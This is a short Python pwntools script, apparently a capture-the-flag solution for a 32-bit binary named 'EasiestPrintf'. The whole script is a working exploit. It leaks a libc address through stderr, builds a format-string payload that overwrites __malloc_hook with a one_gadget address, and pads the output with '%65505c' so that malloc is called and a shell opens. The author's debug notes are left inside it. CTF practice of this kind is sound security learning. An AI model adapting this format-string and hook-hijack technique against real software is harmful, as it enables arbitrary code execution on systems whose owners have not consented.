from pwn import *
context.arch = 'i386'

elf  = ELF("./EasiestPrintf")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
io   = process("./EasiestPrintf")
info("Hijack __malloc_hook and use 65536 to trigger malloc")

io.recvuntil('read:\n')
io.sendline(str(elf.sym['stderr']))
io.recvuntil('0x')
libc_base 	= int(io.recv(8),16)-libc.sym['_IO_2_1_stderr_']
#__libc_system	= libc_base+libc.sym['__libc_system']
__malloc_hook	= libc_base+libc.sym['__malloc_hook']
one_gadget	= libc_base+0x3ac5c
fsb_payload	= fmtstr_payload(7,{__malloc_hook:one_gadget})
print len(fsb_payload)
fsb_payload	+= "%65505c"
info("Why 65505 works but the smaller fails")
io.sendlineafter("Good Bye\n",fsb_payload)
io.interactive()
